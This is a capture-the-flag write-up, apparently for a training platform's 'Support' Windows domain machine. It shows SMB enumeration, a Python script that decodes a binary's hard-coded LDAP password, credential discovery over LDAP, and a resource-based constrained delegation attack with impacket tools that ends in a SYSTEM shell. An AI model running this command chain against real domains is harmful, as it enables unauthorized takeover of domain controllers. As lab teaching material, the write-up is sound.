## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
Support is an Easy difficulty Windows machine that features an SMB share that allows anonymous authentication. After connecting to the share, an executable file is discovered that is used to query the machine&amp;amp;amp;#039;s LDAP server for available users. Through reverse engineering, network analysis or emulation, the password that the binary uses to bind the LDAP server is identified and can be used to make further LDAP queries. A user called `support` is identified in the users list, and the `info` field is found to contain his password, thus allowing for a WinRM connection to the machine. Once on the machine, domain information can be gathered through `SharpHound`, and `BloodHound` reveals that the `Shared Support Accounts` group that the `support` user is a member of, has `GenericAll` privileges on the Domain Controller. A Resource Based Constrained Delegation attack is performed, and a shell as `NT Authority\System` is received.
```
----
#### IP
```IP 
10.129.230.181
```
----
##### Enumeration
- Port Scan 
```bash
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-08-11 12:29:04Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49678/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49695/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49717/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
```
---
#### SMB
```bash
smbclient -L $TARGET -u "" -p ""
Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share
	support-tools   Disk      support staff tools
	SYSVOL          Disk      Logon server share
	

smbclient   //$TARGET/support-tools -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   
  ..                                  
  7-ZipPortable_21.07.paf.exe        
  npp.8.4.1.portable.x64.zip          
  putty.exe                           
  SysinternalsSuite.zip               
  UserInfo.exe.zip                    
  windirstat1_1_2_setup.exe           
  WiresharkPortable64_3.6.5.paf.exe     
```
- Got Interesting `UserInfo.exe.zip`
- Into `UserInfo.exe.zip`
```bash
ls
CommandLineParser.dll                                      Microsoft.Extensions.Logging.Abstractions.dll  System.Runtime.CompilerServices.Unsafe.dll
Microsoft.Bcl.AsyncInterfaces.dll                          System.Buffers.dll                             System.Threading.Tasks.Extensions.dll
Microsoft.Extensions.DependencyInjection.Abstractions.dll  System.Memory.dll                              UserInfo.exe
Microsoft.Extensions.DependencyInjection.dll               System.Numerics.Vectors.dll                    UserInfo.exe.config
```
- Interesting `UserInfo.exe`
- Used `monodis`
```bash
$ monodis --output=UserInfo.il UserInfo.exe

$ ls
UserInfo.il
```
- Key Findings - searching - `enc_password`
```bash
enc_password - 0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E
Key = armando
```
- The actual transformation is:
```
decoded[i] = base64_data[i] XOR key[i % 7] XOR 0xDF
```
- Algorithm 
```python 
import base64
enc = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = b"armando"
data = bytearray(base64.b64decode(enc))

for i in range(len(data)):
    data[i] ^= key[i % len(key)]
    data[i] ^= 0xDF
print(data.decode())
```
- Decoded Password 
```bash
[password omitted]
```
----
##### LDAP 
- ldapsearch
```bash
$ ldapsearch -x \
  -H ldap://10.129.230.181 \
  -D 'support\ldap' \
  -w '[password omitted]' \
  -b 'DC=support,DC=htb' \
  '(objectClass=user)' \
  sAMAccountName info
# extended LDIF
#
# LDAPv3
# base <DC=support,DC=htb> with scope subtree
# filter: (objectClass=user)
# requesting: sAMAccountName info
#

# Administrator, Users, support.htb
dn: CN=Administrator,CN=Users,DC=support,DC=htb
sAMAccountName: Administrator

# Guest, Users, support.htb
dn: CN=Guest,CN=Users,DC=support,DC=htb
sAMAccountName: Guest

# DC, Domain Controllers, support.htb
dn: CN=DC,OU=Domain Controllers,DC=support,DC=htb
sAMAccountName: DC$

# krbtgt, Users, support.htb
dn: CN=krbtgt,CN=Users,DC=support,DC=htb
sAMAccountName: krbtgt

# ldap, Users, support.htb
dn: CN=ldap,CN=Users,DC=support,DC=htb
sAMAccountName: ldap

# support, Users, support.htb
dn: CN=support,CN=Users,DC=support,DC=htb
info: [password omitted]
sAMAccountName: support

# smith.rosario, Users, support.htb
dn: CN=smith.rosario,CN=Users,DC=support,DC=htb
sAMAccountName: smith.rosario

# hernandez.stanley, Users, support.htb
dn: CN=hernandez.stanley,CN=Users,DC=support,DC=htb
sAMAccountName: hernandez.stanley

# wilson.shelby, Users, support.htb
dn: CN=wilson.shelby,CN=Users,DC=support,DC=htb
sAMAccountName: wilson.shelby

# anderson.damian, Users, support.htb
dn: CN=anderson.damian,CN=Users,DC=support,DC=htb
sAMAccountName: anderson.damian

# thomas.raphael, Users, support.htb
dn: CN=thomas.raphael,CN=Users,DC=support,DC=htb
sAMAccountName: thomas.raphael

# levine.leopoldo, Users, support.htb
dn: CN=levine.leopoldo,CN=Users,DC=support,DC=htb
sAMAccountName: levine.leopoldo

# raven.clifton, Users, support.htb
dn: CN=raven.clifton,CN=Users,DC=support,DC=htb
sAMAccountName: raven.clifton

# bardot.mary, Users, support.htb
dn: CN=bardot.mary,CN=Users,DC=support,DC=htb
sAMAccountName: bardot.mary

# cromwell.gerard, Users, support.htb
dn: CN=cromwell.gerard,CN=Users,DC=support,DC=htb
sAMAccountName: cromwell.gerard

# monroe.david, Users, support.htb
dn: CN=monroe.david,CN=Users,DC=support,DC=htb
sAMAccountName: monroe.david

# west.laura, Users, support.htb
dn: CN=west.laura,CN=Users,DC=support,DC=htb
sAMAccountName: west.laura

# langley.lucy, Users, support.htb
dn: CN=langley.lucy,CN=Users,DC=support,DC=htb
sAMAccountName: langley.lucy

# daughtler.mabel, Users, support.htb
dn: CN=daughtler.mabel,CN=Users,DC=support,DC=htb
sAMAccountName: daughtler.mabel

# stoll.rachelle, Users, support.htb
dn: CN=stoll.rachelle,CN=Users,DC=support,DC=htb
sAMAccountName: stoll.rachelle

# ford.victoria, Users, support.htb
dn: CN=ford.victoria,CN=Users,DC=support,DC=htb
sAMAccountName: ford.victoria

# search reference
ref: ldap://ForestDnsZones.support.htb/DC=ForestDnsZones,DC=support,DC=htb

# search reference
ref: ldap://DomainDnsZones.support.htb/DC=DomainDnsZones,DC=support,DC=htb

# search reference
ref: ldap://support.htb/CN=Configuration,DC=support,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 25
# numEntries: 21
# numReferences: 3
```
- Useful Information
```Notes
# support, Users, support.htb
dn: CN=support,CN=Users,DC=support,DC=htb
info: [password omitted]
sAMAccountName: support
```
--- 
##### EVIL-WIN
 - Credentials
```bash
Username: support
Password: [password omitted]
Domain:   support.htb
```
- Output
```bash
$ nxc winrm "$TARGET" \
  -u "$USER" \
  -p "$PASS" \
  -d "$DOMAIN"
WINRM       10.129.230.181  5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb)
/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from cryptography.hazmat.primitives.ciphers.algorithms in 48.0.0.
  arc4 = algorithms.ARC4(self._key)
WINRM       10.129.230.181  5985   DC               [+] support.htb\support:[password omitted] (Pwn3d!)
```
- `Pwn3d!`
```bash
*Evil-WinRM* PS C:\Users\support\Documents> whoami
support\support
*Evil-WinRM* PS C:\Users\support\Documents> whoami /all

USER INFORMATION
----------------

User Name       SID
=============== =============================================
support\support S-1-5-21-1677581083-3380853377-188903654-1105


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
SUPPORT\Shared Support Accounts            Group            S-1-5-21-1677581083-3380853377-188903654-1103 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```
- Flag
```bash
Evil-WinRM* PS C:\Users\support\Desktop> dir

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         8/11/2026   5:20 AM             34 user.txt

*Evil-WinRM* PS C:\Users\support\Desktop> type user.txt
[flag omitted]
```
----
#### Privilege Escalation
- Bloodhound

![[Pasted image 20260811185826.png]]

```bash
SUPPORT@SUPPORT.HTB
        │
        │ MemberOf
        ▼
Shared Support Accounts
        │
        │ GenericAll
        ▼
DC.SUPPORT.HTB
```
- Escalation
```bash
$ TARGET=10.129.230.181
DOMAIN='support.htb'
USER='support'
PASS='[password omitted]'

$ impacket-addcomputer "$DOMAIN/$USER:$PASS" \
  -dc-ip "$TARGET" \
  -computer-name 'FAKEPC$' \
  -computer-pass 'FakePCPassword123!' \
  --debug
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Successfully added machine account FAKEPC$ with password FakePCPassword123!.

$ impacket-rbcd "$DOMAIN/$USER:$PASS" \
  -dc-ip "$TARGET" \
  -delegate-from 'FAKEPC$' \
  -delegate-to 'DC$' \
  -action write
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] FAKEPC$ can now impersonate users on DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     FAKEPC$      (S-1-5-21-1677581083-3380853377-188903654-6101)

```
- New Computer Added Successfully
```bash
$ impacket-getST 'support.htb/FAKEPC$:FakePCPassword123!' \
  -spn 'cifs/DC.support.htb' \
  -impersonate Administrator \
  -dc-ip 10.129.230.181
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_DC.support.htb@SUPPORT.HTB.ccache
```
- `ccache` is stored
----
#### Escalation
```bash
$ export KRB5CCNAME="$PWD/Administrator@cifs_DC.support.htb@SUPPORT.HTB.ccache"

$ klist
Ticket cache: FILE:/home/kali/Administrator@cifs_DC.support.htb@SUPPORT.HTB.ccache
Default principal: Administrator@support.htb

Valid starting       Expires              Service principal
08/11/2026 10:15:31  08/11/2026 20:15:13  cifs/DC.support.htb@SUPPORT.HTB
	renew until 08/12/2026 10:14:34

$ impacket-psexec -k -no-pass 'support.htb/Administrator@DC.support.htb'
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on DC.support.htb.....
[*] Found writable share ADMIN$
[*] Uploading file KnRlMggU.exe
[*] Opening SVCManager on DC.support.htb.....
[*] Creating service SDYM on DC.support.htb.....
[*] Starting service SDYM.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.859]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami /all

USER INFORMATION
----------------

User Name           SID
=================== ========
nt authority\system S-1-5-18


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
BUILTIN\Administrators                 Alias            S-1-5-32-544 Enabled by default, Enabled group, Group owner
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
Mandatory Label\System Mandatory Level Label            S-1-16-16384

C:\Users\Administrator> cd Desktop

C:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is 955A-5CBB

 Directory of C:\Users\Administrator\Desktop

05/28/2022  04:17 AM    <DIR>          .
05/28/2022  04:11 AM    <DIR>          ..
08/11/2026  05:20 AM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   3,970,781,184 bytes free

C:\Users\Administrator\Desktop> type root.txt
[flag omitted]
```

# END